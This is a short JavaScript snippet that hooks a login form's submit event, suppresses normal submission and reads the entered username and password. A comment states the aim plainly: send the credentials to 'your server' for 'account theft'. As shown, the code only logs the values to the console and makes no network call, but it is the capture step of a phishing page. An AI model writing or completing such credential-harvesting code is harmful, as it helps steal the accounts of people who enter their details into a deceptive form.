document.getElementById('login-form').addEventListener('submit', function(event) {
  event.preventDefault();

  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;

  // Send the username and password to your server
  // for further processing and account theft
  console.log('Username: ' + username);
  console.log('Password: ' + password);
});
